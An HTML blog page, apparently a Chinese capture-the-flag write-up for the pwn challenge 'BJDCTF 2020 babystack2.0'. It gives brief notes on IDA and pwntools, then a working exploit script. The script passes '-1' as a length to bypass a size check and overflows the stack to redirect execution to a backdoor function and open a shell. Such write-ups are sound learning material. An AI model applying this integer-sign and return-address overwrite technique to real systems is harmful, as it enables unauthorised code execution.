@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[BJDCTF 2020]babystack2.0 · Y0uYuGe</title>
+<meta name="description" content="没有 file.plt[“backdoor”]，plt 只针对外部函数存在，所以只能用 file.symbol[“backdoor”]。HIDWORD 的作用是取一个 8 字节变量在内存中位于高位的四个字节（即一个 32 位的值），也就是两个字的数据。LODWORD 的作用是取一个 8 字节变量在内存中位于低位的四个字节（即一个 32 位的值），也就是两个字的数据。使用 file.plt[“system”] 不行，因为像这样直接覆盖返回地址没有提供参数。IDA 的栈并不完全准确——连保存的 ebp 都没有显示——所以 IDA 只能作为参考。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2019-2021/%5BBJDCTF%202020%5Dbabystack2.0" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2019-2021">2019–2021 年</a></nav>
+    <h1>[BJDCTF 2020]babystack2.0</h1>
+    <div class="meta"><time>2023-10-22</time><span class="tag">#编程语言</span><span class="tag">#网络安全</span><span class="tag">#安全</span><span class="tag">#系统安全</span><span class="tag">#学习</span><span class="tag">#Pwn</span></div>
+    <article class="post-body">
+<p>HIDWORD 的作用是取一个 8 字节变量在内存中位于高位的四个字节（即一个 32 位的值），也就是两个字的数据
+LODWORD 的作用是取一个 8 字节变量在内存中位于低位的四个字节（即一个 32 位的值），也就是两个字的数据</p>
+<p>IDA 的栈并不完全准确，连保存的 ebp 都没有显示，所以 IDA 只能作为参考
+没有 file.plt[&quot;backdoor&quot;]，plt 只针对外部函数存在，所以只能用 file.symbol[&quot;backdoor&quot;]
+使用 file.plt[&quot;system&quot;] 不行，因为像这样直接覆盖返回地址没有提供参数</p>
+<pre><code class="language-python">from pwn import *
+
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+file=remote(&quot;node4.anna.nssctf.cn&quot;,&quot;28129&quot;)
+elf=ELF(&quot;/home/llk/下载/pwn&quot;)
+file.sendlineafter(&quot;name:&quot;,&quot;-1&quot;)
+system_addr=elf.sym[&quot;backdoor&quot;]
+payload=b&#39;a&#39;*0x18+p64(system_addr)
+file.sendlineafter(&quot;name?\n&quot;,payload)
+file.interactive()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><span></span><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2019-2021/2019%20-%20CTF%20Pwn%20OOB/"><span class="l">下一篇</span>2019 *CTF Pwn OOB</a></nav>
+  </main>
+  
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
